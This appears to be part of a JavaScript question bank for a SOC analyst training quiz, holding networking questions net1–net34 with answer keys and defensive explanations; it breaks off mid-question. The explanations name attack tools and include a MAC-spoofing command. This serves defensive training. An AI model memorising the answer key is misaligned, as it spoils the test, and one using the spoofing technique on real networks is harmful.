/**
 * SOC Analyst Professional Training Platform - Question Database
 *
 * This file contains all 300 questions across 6 categories:
 * - Networking (50 questions)
 * - Web Attacks (50 questions)
 * - Firewall Rules (50 questions)
 * - Malware Analysis (50 questions)
 * - Security Devices (50 questions)
 * - Log Analysis (50 questions)
 *
 * Each question includes detailed explanations, MITRE ATT&CK references,
 * CVE numbers, tools, and real-world defense strategies.
 *
 * Format: Tier-1 SOC Analyst level (foundational knowledge)
 */

const questionBank = {
    networking: [
        {
            id: 'net1',
            title: 'TCP/IP Layer Identification',
            points: 8,
            question: 'A user cannot access a website. You capture packets and see TCP SYN packets leaving the client but no SYN-ACK returning. At which layer should you investigate first?',
            type: 'radio',
            options: [
                { value: 'application', text: 'Application Layer' },
                { value: 'transport', text: 'Transport Layer' },
                { value: 'network', text: 'Network Layer' },
                { value: 'datalink', text: 'Data Link Layer' },
                { value: 'physical', text: 'Physical Layer' }
            ],
            correct: 'network',
            explanation: '🎯 Network Layer (Layer 3) issue. SYN packets leaving means Transport Layer is working. No SYN-ACK returning indicates routing failure, firewall blocking, or destination unreachable. The packet dies somewhere in the network infrastructure before reaching the server or returning to the client. Check: routing tables, firewall ACLs, IP connectivity.'
        },
        {
            id: 'net2',
            title: 'Protocol Analysis',
            points: 7,
            question: 'You observe traffic on port 3389 from multiple external IPs to your internal server 192.168.50.10. What protocol is this and why is it concerning?',
            type: 'radio',
            options: [
                { value: 'rdp', text: 'RDP (Remote Desktop)' },
                { value: 'ssh', text: 'SSH (Secure Shell)' },
                { value: 'vnc', text: 'VNC (Virtual Desktop)' },
                { value: 'xrdp', text: 'X11 Remote Display' },
                { value: 'wts', text: 'Windows Terminal Services' }
            ],
            correct: 'rdp',
            explanation: '🚨 Port 3389 = RDP (Remote Desktop Protocol). Multiple external IPs = active brute force campaign. RDP exposed to internet is a CRITICAL vulnerability - common ransomware entry point. Best practice: Disable external RDP, use VPN with MFA, or implement RDP gateway. See: BlueKeep (CVE-2019-0708), DejaBlue attacks.'
        },
        {
            id: 'net3',
            title: 'Packet Analysis',
            points: 10,
            question: 'Analyze this TCP handshake:<br><code>1. Client 10.5.20.100:51234 → Server 172.16.8.50:443 [SYN] Seq=1000<br>2. Server 172.16.8.50:443 → Client 10.5.20.100:51234 [SYN-ACK] Seq=5000 Ack=1001<br>3. Client 10.5.20.100:51234 → Server 172.16.8.50:443 [ACK] Seq=1001 Ack=?</code><br><br>What should the Ack number be in packet 3?',
            type: 'radio',
            options: [
                { value: '5001', text: '5001' },
                { value: '5000', text: '5000' },
                { value: '1001', text: '1001' },
                { value: '6000', text: '6000' },
                { value: '4999', text: '4999' }
            ],
            correct: '5001',
            explanation: '📊 TCP acknowledgment = "next byte I expect to receive". Server sent Seq=5000, client responds with Ack=5001 (5000+1). Formula: Ack = ReceivedSeq + DataBytes (for SYN/FIN, +1 even with no data). This is fundamental TCP behavior tested in CCNA, Network+, and packet analysis interviews. Wrong answer like 5000 would cause retransmissions.'
        },
        {
            id: 'net4',
            title: 'DNS Query Analysis',
            points: 7,
            question: 'You observe repeated DNS queries for randomized subdomains like "x8k2p.malicious.com", "9mq4z.malicious.com". What attack is this?',
            type: 'radio',
            options: [
                { value: 'dga', text: 'Domain Generation Algorithm / DNS tunneling' },
                { value: 'dnssec', text: 'DNSSEC validation issues' },
                { value: 'cache', text: 'DNS cache poisoning attempt' },
                { value: 'flood', text: 'DNS amplification DDoS' },
                { value: 'legit', text: 'CDN load balancing' }
            ],
            correct: 'dga',
            explanation: '🔴 DGA (Domain Generation Algorithm) or DNS Tunneling. Malware uses algorithmically generated domains to find C2 servers or exfiltrate data via DNS queries. Random-looking subdomains + high query volume = red flag. Defense: Monitor DNS query entropy, block known DGA domains, analyze query patterns. See: Conficker, Cryptolocker, Emotet DGA behavior.'
        },
        {
            id: 'net5',
            title: 'ARP Spoofing Detection',
            points: 8,
            question: 'Multiple hosts on your network suddenly report the same MAC address (00:11:22:33:44:55) for the default gateway IP. What attack is occurring?',
            type: 'radio',
            options: [
                { value: 'arp_spoof', text: 'ARP spoofing / ARP poisoning' },
                { value: 'mac_flood', text: 'MAC flooding' },
                { value: 'dhcp_starv', text: 'DHCP starvation attack' },
                { value: 'stp', text: 'STP misconfiguration' },
                { value: 'vlan', text: 'VLAN hopping attack' }
            ],
            correct: 'arp_spoof',
            explanation: '⚠️ ARP Spoofing/Poisoning: Attacker sends fake ARP replies claiming to be the gateway, redirecting all traffic through their machine for man-in-the-middle attacks. Multiple hosts see wrong MAC = attacker broadcasting poisoned ARP. Defense: Static ARP entries, Dynamic ARP Inspection (DAI), use switches with ARP protection, monitor for duplicate MAC addresses. Layer 2 attack!'
        },
        {
            id: 'net6',
            title: 'ICMP Analysis',
            points: 6,
            question: 'You see large ICMP Type 8 packets (64KB) being sent to your network. What attack is this likely?',
            type: 'radio',
            options: [
                { value: 'ping_death', text: 'Ping of Death' },
                { value: 'smurf', text: 'Smurf attack' },
                { value: 'ping_flood', text: 'Ping flood' },
                { value: 'traceroute', text: 'Traceroute reconnaissance' },
                { value: 'normal', text: 'Normal ping operations' }
            ],
            correct: 'ping_death',
            explanation: '💥 Ping of Death: Oversized ICMP packets (>65,535 bytes) cause buffer overflows in older systems. ICMP Type 8 = Echo Request. 64KB packets = malicious. Modern systems patch this, but can still crash poorly coded apps. Defense: Fragment reassembly limits, drop packets >MTU, update systems. Historical: CVE-1996-0328.'
        },
        {
            id: 'net7',
            title: 'Port State Analysis',
            points: 7,
            question: 'An nmap scan shows port 22 as "filtered". What does this mean?',
            type: 'radio',
            options: [
                { value: 'filtered', text: 'Firewall blocking' },
                { value: 'closed', text: 'Port is closed' },
                { value: 'open', text: 'Port is open and accepting connections' },
                { value: 'stealth', text: 'Host is using stealth/anti-scan techniques' },
                { value: 'down', text: 'Host is completely offline' }
            ],
            correct: 'filtered',
            explanation: '🛡️ "Filtered" = firewall/ACL is blocking the probe packets. No SYN-ACK, no RST, no ICMP unreachable - just silence. Attacker cannot determine if service exists. Better than "closed" (RST response confirms port exists but closed). "Open" = SYN-ACK received. Best security: Filter + don\'t respond (stealth mode). Nmap flags: --packet-trace to debug.'
        },
        {
            id: 'net8',
            title: 'Subnet Calculation',
            points: 7,
            question: 'How many usable host IPs are in the subnet 10.0.50.0/25?',
            type: 'radio',
            options: [
                { value: '126', text: '126 hosts' },
                { value: '128', text: '128 hosts' },
                { value: '254', text: '254 hosts' },
                { value: '256', text: '256 hosts' },
                { value: '62', text: '62 hosts' }
            ],
            correct: '126',
            explanation: '🔢 /25 = 255.255.255.128 = 2^(32-25) = 2^7 = 128 total IPs. Usable hosts = 128 - 2 (network + broadcast) = 126. Range: 10.0.50.0-127. Network: .0, Broadcast: .127. First host: .1, Last host: .126. Common mistake: forgetting to subtract 2. Formula: 2^(host bits) - 2. Subnetting tested heavily in Network+ and SOC interviews.'
        },
        {
            id: 'net9',
            title: 'BGP Hijacking Detection',
            points: 9,
            question: 'You notice your company\'s public IP range is suddenly being announced by an AS in another country. What attack is this?',
            type: 'radio',
            options: [
                { value: 'bgp_hijack', text: 'BGP hijacking' },
                { value: 'dns_hijack', text: 'DNS hijacking' },
                { value: 'ip_spoof', text: 'IP address spoofing' },
                { value: 'mitm', text: 'Man-in-the-middle attack' },
                { value: 'nat', text: 'NAT misconfiguration' }
            ],
            correct: 'bgp_hijack',
            explanation: '🌐 BGP Hijacking: Attacker announces YOUR IP prefixes from their AS (Autonomous System), redirecting internet traffic to their network. Used for DDoS, espionage, cryptocurrency theft. Defense: RPKI (Resource Public Key Infrastructure), ROA (Route Origin Authorization), BGP monitoring services, prefix filtering. Famous incidents: Pakistan Telecom vs YouTube 2008, Cloudflare 2024.'
        },
        {
            id: 'net10',
            title: 'VLAN Security',
            points: 8,
            question: 'A workstation on VLAN 10 can suddenly access servers on VLAN 20. What vulnerability was exploited?',
            type: 'radio',
            options: [
                { value: 'vlan_hop', text: 'VLAN hopping' },
                { value: 'acl', text: 'Firewall ACL misconfiguration' },
                { value: 'routing', text: 'Inter-VLAN routing enabled' },
                { value: 'trunk', text: 'Trunk port misconfigured as access port' },
                { value: 'nat', text: 'NAT traversal' }
            ],
            correct: 'vlan_hop',
            explanation: '🔓 VLAN Hopping: Attacker sends double-tagged 802.1Q frames. Outer tag (VLAN 10) stripped by first switch, inner tag (VLAN 20) processed by next switch = access to isolated VLAN. Also: DTP (Dynamic Trunking Protocol) exploitation. Defense: Disable DTP, prune unused VLANs from trunks, native VLAN ≠ 1, port security. VLANs provide segmentation, not security!'
        },
        {
            id: 'net11',
            title: 'DHCP Starvation Attack',
            points: 7,
            question: 'Your network suddenly has no available DHCP addresses, but the DHCP server shows thousands of leases to different MAC addresses. What attack is this?',
            type: 'radio',
            options: [
                { value: 'dhcp_starv', text: 'DHCP starvation' },
                { value: 'dhcp_spoof', text: 'Rogue DHCP server' },
                { value: 'ip_conflict', text: 'IP address conflicts' },
                { value: 'dos', text: 'Network DoS attack' },
                { value: 'broadcast', text: 'Broadcast storm' }
            ],
            correct: 'dhcp_starv',
            explanation: '🔴 DHCP Starvation: Attacker floods DHCP DISCOVER requests with spoofed MAC addresses, exhausting the entire IP address pool. Legitimate clients cannot get IPs = network DoS. Often followed by rogue DHCP server attack (attacker becomes new DHCP). Defense: DHCP snooping, rate limiting, port security, monitor lease table size. Tool: Yersinia, dhcpstarv.'
        },
        {
            id: 'net12',
            title: 'SYN Flood Analysis',
            points: 8,
            question: 'A server shows thousands of connections in SYN_RECV state. CPU and bandwidth are normal. What attack is this?',
            type: 'radio',
            options: [
                { value: 'syn_flood', text: 'SYN flood' },
                { value: 'http_flood', text: 'HTTP flood' },
                { value: 'udp_flood', text: 'UDP flood' },
                { value: 'slowloris', text: 'Slowloris' },
                { value: 'legit', text: 'Legitimate high traffic' }
            ],
            correct: 'syn_flood',
            explanation: '💥 SYN Flood: Attacker sends SYN packets with spoofed source IPs, server responds with SYN-ACK, but never receives final ACK. Connections stuck in SYN_RECV state = exhausts connection table (not bandwidth). Defense: SYN cookies, increase backlog queue, rate limiting, firewall with SYN proxy. Check: netstat -an | grep SYN_RECV | wc -l. Classic DoS attack, still effective!'
        },
        {
            id: 'net13',
            title: 'IPv6 Neighbor Discovery',
            points: 7,
            question: 'An attacker is sending Router Advertisement (RA) messages on your IPv6 network. What is the risk?',
            type: 'radio',
            options: [
                { value: 'rogue_ra', text: 'Rogue router' },
                { value: 'icmpv6', text: 'ICMPv6 flood attack' },
                { value: 'slaac', text: 'SLAAC address exhaustion' },
                { value: 'normal', text: 'Normal IPv6 operations' },
                { value: 'multicast', text: 'Multicast storm' }
            ],
            correct: 'rogue_ra',
            explanation: '🚨 Rogue Router Advertisement: Attacker advertises themselves as default IPv6 router via RA messages. Clients reconfigure routing = all traffic flows through attacker (MITM). IPv6 has no built-in authentication for RA! Defense: RA Guard on switches, disable IPv6 if unused, IPSec, SEND (Secure Neighbor Discovery). Similar to DHCP spoofing but for IPv6. Check: radvd, radvdump.'
        },
        {
            id: 'net14',
            title: 'SSL/TLS Version Detection',
            points: 6,
            question: 'Your SSL scanner shows a server supporting SSLv3 and TLS 1.0. What is the primary risk?',
            type: 'radio',
            options: [
                { value: 'poodle', text: 'POODLE attack and weak cipher vulnerabilities' },
                { value: 'mitm', text: 'Certificate man-in-the-middle attacks' },
                { value: 'dos', text: 'SSL handshake DoS' },
                { value: 'cert_expiry', text: 'Certificate expiration' },
                { value: 'none', text: 'No risk' }
            ],
            correct: 'poodle',
            explanation: '🔓 SSLv3 = POODLE vulnerability (CVE-2014-3566), TLS 1.0 = BEAST attack vulnerable. Both use weak ciphers (RC4, CBC). Modern compliance (PCI DSS) requires TLS 1.2+. Defense: Disable SSLv3, TLS 1.0, TLS 1.1. Enable only TLS 1.2/1.3 with strong ciphers (AES-GCM, ChaCha20). Test with: nmap --script ssl-enum-ciphers, testssl.sh, Qualys SSL Labs.'
        },
        {
            id: 'net15',
            title: 'NetBIOS Attack Vector',
            points: 7,
            question: 'You see UDP port 137 (NetBIOS Name Service) traffic from an internal host to multiple workstations. What is likely occurring?',
            type: 'radio',
            options: [
                { value: 'nbns_spoof', text: 'NBNS/LLMNR poisoning' },
                { value: 'scan', text: 'Network scanning / reconnaissance' },
                { value: 'file_share', text: 'Normal Windows file sharing' },
                { value: 'wins', text: 'WINS server communication' },
                { value: 'backup', text: 'Backup operations' }
            ],
            correct: 'nbns_spoof',
            explanation: '⚠️ NBNS/LLMNR Poisoning: Attacker responds to NetBIOS/LLMNR name resolution requests, redirecting victims to attacker-controlled server. Victims send credentials (NTLM hashes) = harvested for cracking. Tool: Responder, Inveigh. Defense: Disable NBNS/LLMNR via GPO, use DNS only, network segmentation. Port 137 UDP + broadcast = red flag. See: MITRE T1557.001 (LLMNR/NBT-NS Poisoning).'
        },
        {
            id: 'net16',
            title: 'HTTP Status Code Analysis',
            points: 6,
            question: 'Web server logs show repeated requests returning HTTP 401, then suddenly HTTP 200. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'brute_success', text: 'Brute force authentication' },
                { value: 'config', text: 'Server misconfiguration' },
                { value: 'legit', text: 'User correctly entered password after typos' },
                { value: 'redirect', text: 'HTTP redirect behavior' },
                { value: 'cache', text: 'Browser cache issues' }
            ],
            correct: 'brute_success',
            explanation: '🚨 Successful Brute Force: HTTP 401 = Unauthorized (wrong creds), repeated 401s = brute forcing, HTTP 200 = Success (valid creds found). Pattern: 401, 401, 401... 200 = compromised account! Could be user with typos, but multiple rapid 401s = attack. Defense: Rate limiting, account lockout, MFA, CAPTCHA, monitor failed login attempts. Alert on: >5 401s followed by 200 from same IP.'
        },
        {
            id: 'net17',
            title: 'MAC Address Analysis',
            points: 7,
            question: 'You notice a MAC address starting with 00:50:56. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'vmware', text: 'VMware virtual machine' },
                { value: 'cisco', text: 'Cisco network device' },
                { value: 'spoofed', text: 'Spoofed MAC address' },
                { value: 'linux', text: 'Linux system' },
                { value: 'mobile', text: 'Mobile device' }
            ],
            correct: 'vmware',
            explanation: '🖥️ OUI (Organizationally Unique Identifier): First 3 bytes identify manufacturer. 00:50:56 = VMware, 00:0C:29 = VMware, 00:1B:63 = Apple, 00:1A:A0 = Dell. Malware may detect VMs via MAC and refuse to run (sandbox evasion). Security tools often use VMs = attackers fingerprint. Defense: Randomize VM MACs, use physical machines for honeypots. Check OUI: wireshark.org/tools/oui-lookup.html.'
        },
        {
            id: 'net18',
            title: 'Proxy Auto-Config Hijacking',
            points: 8,
            question: 'Browsers on your network are using a PAC file from an unexpected internal IP. What attack is this?',
            type: 'radio',
            options: [
                { value: 'pac_hijack', text: 'WPAD/PAC hijacking' },
                { value: 'dns_hijack', text: 'DNS hijacking' },
                { value: 'dhcp_option', text: 'DHCP option misconfiguration' },
                { value: 'browser', text: 'Browser malware extension' },
                { value: 'proxy', text: 'Normal proxy configuration' }
            ],
            correct: 'pac_hijack',
            explanation: '🔴 WPAD/PAC Hijacking: WPAD (Web Proxy Auto-Discovery) uses DNS/DHCP to find PAC (Proxy Auto-Config) file. Attacker responds first with malicious PAC file = all HTTP/HTTPS traffic routes through attacker proxy. Defense: Disable WPAD, use manual proxy config, block WPAD DNS queries, DHCP option 252 security. Tool: Responder can exploit WPAD. Famous: WPAD name collision attack.'
        },
        {
            id: 'net19',
            title: 'Fragmentation Attack Detection',
            points: 8,
            question: 'IDS shows IP packets with Fragment Offset that overlaps previous fragments. What attack is this?',
            type: 'radio',
            options: [
                { value: 'teardrop', text: 'Teardrop attack' },
                { value: 'frag_flood', text: 'Fragment flood DoS' },
                { value: 'evasion', text: 'IDS evasion technique' },
                { value: 'normal', text: 'Normal fragmentation due to MTU' },
                { value: 'rose', text: 'Rose attack' }
            ],
            correct: 'teardrop',
            explanation: '💥 Teardrop Attack: Sends fragmented IP packets with overlapping fragment offsets. Reassembly causes buffer overflow = crash/kernel panic. Old vulnerability (1997) but still works on unpatched embedded devices. Similar: Bonk, Boink attacks. Defense: Fragment reassembly validation, drop malformed packets, update TCP/IP stack. Modern: fragmentation used for IDS evasion (FragRoute tool).'
        },
        {
            id: 'net20',
            title: 'SMB Version Detection',
            points: 7,
            question: 'Your vulnerability scanner shows servers running SMBv1. What is the critical risk?',
            type: 'radio',
            options: [
                { value: 'eternalblue', text: 'EternalBlue exploitation' },
                { value: 'slow', text: 'Performance degradation' },
                { value: 'auth', text: 'Weak authentication' },
                { value: 'none', text: 'No risk' },
                { value: 'mitm', text: 'Man-in-the-middle attacks' }
            ],
            correct: 'eternalblue',
            explanation: '🔥 SMBv1 = EternalBlue (MS17-010 / CVE-2017-0144) vulnerability. Remote code execution, no authentication required. Used by WannaCry, NotPetya, Ryuk ransomware. Also: multiple memory corruption bugs, no encryption. Defense: DISABLE SMBv1 immediately (PowerShell: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol), use SMBv3+, patch MS17-010. Check: nmap --script smb-protocols. SMBv1 = instant critical finding in audits!'
        },
        {
            id: 'net21',
            title: 'Common Ports Recognition',
            points: 5,
            question: 'Which service typically runs on port 3389/TCP?',
            type: 'radio',
            options: [
                { value: 'rdp', text: 'RDP' },
                { value: 'mysql', text: 'MySQL database' },
                { value: 'https', text: 'HTTPS web traffic' },
                { value: 'smtp', text: 'Email SMTP' },
                { value: 'ftp', text: 'FTP file transfer' }
            ],
            correct: 'rdp',
            explanation: '🖥️ Port 3389 = RDP (Remote Desktop Protocol). Windows remote GUI access. High value target for attackers (brute force, BlueKeep CVE-2019-0708). Other common ports: 22=SSH, 23=Telnet, 25=SMTP, 80=HTTP, 443=HTTPS, 3306=MySQL, 1433=MSSQL, 5432=PostgreSQL, 27017=MongoDB. SOC analysts should memorize top 20 ports for quick triage. Tool: netstat, lsof, ss. Unusual port usage = potential C2 channel.'
        },
        {
            id: 'net22',
            title: 'MAC Address Spoofing',
            points: 6,
            question: 'Attacker changes MAC address to 00:11:22:33:44:55 to bypass access control. What is this attack?',
            type: 'radio',
            options: [
                { value: 'mac_spoof', text: 'MAC spoofing' },
                { value: 'ip_spoof', text: 'IP address spoofing' },
                { value: 'arp_poison', text: 'ARP poisoning' },
                { value: 'vlan_hop', text: 'VLAN hopping' },
                { value: 'dns_spoof', text: 'DNS spoofing' }
            ],
            correct: 'mac_spoof',
            explanation: '🎭 MAC Spoofing: Change Layer 2 hardware address to bypass MAC filtering (weak security), impersonate authorized device, or evade detection. Linux: ifconfig eth0 hw ether 00:11:22:33:44:55. Windows: registry edit or TMAC. Bypass: WiFi MAC filters, network access control (if not using 802.1X). Defense: 802.1X authentication (EAP-TLS), port security (limit MACs per port), dynamic ARP inspection. Detection: Multiple IPs with same MAC, MAC vendor mismatch (Dell OUI with Apple device).'
        },
        {
            id: 'net23',
            title: 'Broadcast Storm',
            points: 6,
            question: 'Network experiencing 90% utilization with excessive broadcast frames. What is likely cause?',
            type: 'radio',
            options: [
                { value: 'loop', text: 'Switching loop' },
                { value: 'ddos', text: 'DDoS attack from external source' },
                { value: 'malware', text: 'Malware infection spreading' },
                { value: 'backup', text: 'Large file backup in progress' },
                { value: 'normal', text: 'Normal network traffic' }
            ],
            correct: 'loop',
            explanation: '🌀 Broadcast Storm: Layer 2 loop (no STP) causes broadcasts to circulate infinitely → network meltdown. Symptoms: High CPU on switches, network unreachable, intermittent connectivity. Caused by: Accidental cable loop, misconfigured STP, rogue switch. Fix: Physically disconnect loop, enable STP (802.1D/RSTP/MSTP), BPDU guard on access ports. Prevention: Loop detection, UDLD (Unidirectional Link Detection). Not DDoS (broadcasts stay local). Tool: Wireshark filter "eth.dst==ff:ff:ff:ff:ff:ff".'
        },
        {
            id: 'net24',
            title: 'Proxy vs VPN',
            points: 5,
            question: 'What is key difference between web proxy and VPN for user traffic?',
            type: 'radio',
            options: [
                { value: 'scope', text: 'Proxy = application layer, VPN = all network traffic' },
                { value: 'encryption', text: 'Proxy encrypts, VPN does not' },
                { value: 'speed', text: 'Proxy is always faster than VPN' },
                { value: 'security', text: 'Proxy is more secure than VPN' },
                { value: 'same', text: 'They are the same technology' }
            ],
            correct: 'scope',
            explanation: '🔀 Proxy vs VPN: **Proxy** = Application-specific (HTTP/SOCKS proxy), browser configured to use proxy, only web traffic proxied, can inspect/filter HTTP. **VPN** = Network-layer tunnel, ALL traffic encrypted and routed through VPN, transparent to applications. Use proxy for: Web filtering, URL categorization, corporate web policy. Use VPN for: Remote access to internal network, encrypt all traffic (including non-HTTP). Combo: VPN + proxy = defense in depth. Bypass detection: Proxy PAC files, VPN kill switch.'
        },
        {
            id: 'net25',
            title: 'Multicast Traffic',
            points: 6,
            question: 'Traffic destined to 224.0.0.0/4 range. What type of traffic is this?',
            type: 'radio',
            options: [
                { value: 'multicast', text: 'Multicast' },
                { value: 'broadcast', text: 'Broadcast traffic' },
                { value: 'unicast', text: 'Unicast traffic' },
                { value: 'anycast', text: 'Anycast routing' },
                { value: 'malicious', text: 'Malicious scanning traffic' }
            ],
            correct: 'multicast',
            explanation: '📡 Multicast: One-to-many (efficient). IPv4 range 224.0.0.0 to 239.255.255.255 (Class D). Examples: 224.0.0.1 = all hosts, 224.0.0.2 = all routers, 239.x.x.x = organization-local. Uses: Video streaming (IPTV), routing protocols (OSPF, EIGRP), service discovery (mDNS, SSDP). vs Broadcast (255.255.255.255 = all hosts, doesn\'t cross routers). Protocol: IGMP (Internet Group Management Protocol). Security: IGMP snooping (prevent multicast flooding), ACLs on multicast groups. Abuse: DDoS amplification (SSDP reflection).'
        },
        {
            id: 'net26',
            title: 'TCP Flags Analysis',
            points: 7,
            question: 'Packet capture shows TCP flags: SYN=1, ACK=1. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'synack', text: 'SYN-ACK' },
                { value: 'syn_scan', text: 'SYN scan probe' },
                { value: 'connection_reset', text: 'Connection reset' },
                { value: 'established', text: 'Established connection data transfer' },
                { value: 'malformed', text: 'Malformed packet' }
            ],
            correct: 'synack',
            explanation: '🚩 TCP Flags: SYN+ACK = step 2 of 3-way handshake (server accepts connection). **Handshake**: Client SYN → Server SYN-ACK → Client ACK. Other flags: FIN (close), RST (reset/reject), PSH (push data), URG (urgent). **Attack patterns**: SYN flood (SYN only, no ACK), XMAS scan (FIN+PSH+URG), NULL scan (no flags), ACK scan (firewall mapping). Wireshark filter: tcp.flags.syn==1 && tcp.flags.ack==1. Established connection = ACK only (no SYN). SOC: Excessive SYN without SYN-ACK = port scan or DDoS.'
        },
        {
            id: 'net27',
            title: 'IPv6 Privacy Extensions',
            points: 6,
            question: 'Why do modern devices use randomized IPv6 addresses instead of EUI-64 format?',
            type: 'radio',
            options: [
                { value: 'privacy', text: 'Privacy' },
                { value: 'security', text: 'Security' },
                { value: 'performance', text: 'Performance' },
                { value: 'compatibility', text: 'Compatibility with IPv4' },
                { value: 'required', text: 'Required by IPv6 specification' }
            ],
            correct: 'privacy',
            explanation: '🔒 IPv6 Privacy Extensions (RFC 4941): EUI-64 = embed MAC address in IPv6 (predictable, trackable across networks). Privacy extensions = temporary randomized addresses, rotate periodically (daily). Example: 2001:db8::1234:5678:9abc:def0 (random) vs 2001:db8::0200:5eff:fe00:5301 (EUI-64 from MAC 00:00:5e:00:53:01). Benefit: Privacy (can\'t track device across coffee shops). Trade-off: Logging/forensics harder. Configure: Windows/Linux/macOS enabled by default. Security: Still need firewall (IPv6 often forgotten in security policies).'
        },
        {
            id: 'net28',
            title: 'DNS Record Types',
            points: 5,
            question: 'Which DNS record type specifies mail servers for a domain?',
            type: 'radio',
            options: [
                { value: 'mx', text: 'MX' },
                { value: 'a', text: 'A' },
                { value: 'cname', text: 'CNAME' },
                { value: 'txt', text: 'TXT' },
                { value: 'ptr', text: 'PTR' }
            ],
            correct: 'mx',
            explanation: '📧 DNS Record Types: **MX** = Mail servers (priority 10, 20...). **A** = IPv4 address. **AAAA** = IPv6 address. **CNAME** = Alias (www → webserver.example.com). **TXT** = Text (SPF, DKIM, domain verification). **PTR** = Reverse DNS (IP → hostname). **NS** = Nameservers. **SOA** = Zone authority. SOC relevance: MX enumeration (recon), TXT for C2 (DNS tunneling), typosquatting MX records (intercept email), missing SPF/DMARC (phishing). Tools: dig, nslookup, host. Query: dig example.com MX.'
        },
        {
            id: 'net29',
            title: 'Latency vs Bandwidth',
            points: 5,
            question: 'Users complain "website feels slow" but bandwidth utilization is only 10%. What is likely issue?',
            type: 'radio',
            options: [
                { value: 'latency', text: 'High latency/ping time' },
                { value: 'bandwidth', text: 'Insufficient bandwidth' },
                { value: 'malware', text: 'Malware infection' },
                { value: 'dns', text: 'DNS server failure' },
                { value: 'normal', text: 'Normal behavior' }
            ],
            correct: 'latency',
            explanation: '⏱️ Latency vs Bandwidth: **Bandwidth** = throughput (Mbps/Gbps), how much data. **Latency** = delay (ms), how fast data travels. Analogy: Bandwidth = highway lanes, Latency = speed limit. High latency causes: Geographic distance (US ↔ Australia = 150ms+), routing issues, packet loss (retransmissions), congestion. Fix: CDN (content closer to user), optimize routes (BGP), reduce packet loss, TCP tuning. Tools: ping (ICMP latency), traceroute (hop-by-hop), iperf (bandwidth test). VoIP/gaming very sensitive to latency (>100ms = bad experience).'
        },
        {
            id: 'net30',
            title: 'DHCP Rogue Server',
            points: 7,
            question: 'Multiple users report obtaining 192.168.99.x addresses instead of expected 10.0.x.x. What attack?',
            type: 'radio',
            options: [
                { value: 'rogue_dhcp', text: 'Rogue DHCP server' },
                { value: 'dhcp_exhaustion', text: 'DHCP pool exhaustion' },
                { value: 'dns_hijack', text: 'DNS hijacking' },
                { value: 'arp_poison', text: 'ARP poisoning' },
                { value: 'misconfiguration', text: 'IT misconfigured subnet' }
            ],
            correct: 'rogue_dhcp',
            explanation: '🚨 Rogue DHCP Attack: Attacker runs DHCP server, faster response than legitimate server → victims get: Wrong IP, Attacker\'s gateway (MITM all traffic), Malicious DNS (redirect to phishing). DHCP race = first response wins. Attack tools: Ettercap, Yersinia, Responder. Impact: Steal credentials, intercept traffic, redirect DNS. Defense: DHCP snooping (trusted ports only), 802.1X (authenticate before network access), monitor for multiple DHCP servers. Detection: Wireshark DHCP offers from unexpected sources, users report connectivity issues. Fix: Locate rogue device (MAC address tracking), port shutdown.'
        },
        {
            id: 'net31',
            title: 'NAT Types',
            points: 6,
            question: 'What is difference between SNAT and DNAT?',
            type: 'radio',
            options: [
                { value: 'direction', text: 'SNAT = change source IP, DNAT = change destination IP' },
                { value: 'security', text: 'SNAT is secure, DNAT is insecure' },
                { value: 'speed', text: 'SNAT is faster than DNAT' },
                { value: 'protocol', text: 'SNAT for TCP, DNAT for UDP' },
                { value: 'same', text: 'They are the same' }
            ],
            correct: 'direction',
            explanation: '🔄 NAT Types: **SNAT (Source NAT)** = Outbound, rewrite source IP (10.1.1.50 → 203.0.113.10 public IP). Typical for internet access (PAT/overload = many internal IPs → one public IP + different ports). **DNAT (Destination NAT)** = Inbound, rewrite destination IP. Port forwarding: External 203.0.113.10:443 → Internal 10.1.1.50:443 (web server). Also: **Static NAT** = 1:1 mapping. **Dynamic NAT** = pool of IPs. iptables: SNAT = POSTROUTING, DNAT = PREROUTING. Cisco: ip nat inside/outside. Security: DNAT exposes internal services (use firewall rules).'
        },
        {
            id: 'net32',
            title: 'WiFi Security Protocols',
            points: 7,
            question: 'Which WiFi encryption protocol should be avoided due to known vulnerabilities?',
            type: 'checkbox',
            options: [
                { value: 'wep', text: 'WEP' },
                { value: 'wpa', text: 'WPA' },
                { value: 'wpa2_tkip', text: 'WPA2 with TKIP' },
                { value: 'wpa2_aes', text: 'WPA2 with AES-CCMP' },
                { value: 'wpa3', text: 'WPA3' },
                { value: 'open', text: 'Open network' }
            ],
            correct: ['wep', 'wpa', 'wpa2_tkip', 'open'],
            explanation: '📶 WiFi Security Evolution: **WEP** (1999) = Broken, crack in <5 min (aircrack-ng). **WPA/TKIP** (2003) = Deprecated, vulnerable to KRACK. **WPA2-AES** (2004) = Good (but vulnerable to KRACK attack CVE-2017-13077, requires client update). **WPA3** (2018) = Best, SAE (Simultaneous Authentication of Equals) prevents offline dictionary attacks, forward secrecy. Enterprise: 802.1X/EAP-TLS (certificate auth). Open WiFi = plaintext (use VPN). PCI-DSS requires WPA2+ for cardholder data environments. Attack: Capture 4-way handshake → offline brute force (hashcat). Minimum: WPA2-AES, long passphrase (20+ chars).'
        },
        {
            id: 'net33',
            title: 'Proxy ARP',
            points: 6,
            question: 'Router responds to ARP requests on behalf of devices on different subnet. What is this feature?',
            type: 'radio',
            options: [
                { value: 'proxy_arp', text: 'Proxy ARP' },
                { value: 'arp_poisoning', text: 'ARP poisoning attack' },
                { value: 'gratuitous_arp', text: 'Gratuitous ARP' },
                { value: 'reverse_arp', text: 'Reverse ARP' },
                { value: 'dynamic_arp', text: 'Dynamic ARP Inspection' }
            ],
            correct: 'proxy_arp',
            explanation: '🔄 Proxy ARP: Router answers ARP requests for hosts on OTHER subnets (acts as middleman). Scenario: Host misconfigured with wrong subnet mask, thinks destination is local, sends ARP → Router responds with its own MAC → traffic routed correctly. Legitimate use: Bridging, mobile IP. Security risk: Enables ARP spoofing attacks, confuses network topology. Disable unless needed: Cisco "no ip proxy-arp". vs **Gratuitous ARP** = announce own IP (duplicate IP detection). **DAI** = validate ARP packets (prevent poisoning). Detection: Multiple IPs behind single MAC (router proxy-arping for many hosts).'
        },
        {
            id: 'net34',
            title: 'Jumbo Frames',
            points: 5,
            question: 'Network supports jumbo frames (9000 byte MTU). What is primary benefit?',
            type: 'radio',
            options: [
                { value: 'efficiency', text: 'Increased efficiency' },
                { value: 'security', text: 'Improved security against packet sniffing' },
                { value: 'encryption', text: 'Stronger encryption capabilities' },
                { value: 'latency', text: 'Reduced latency for small packets' },
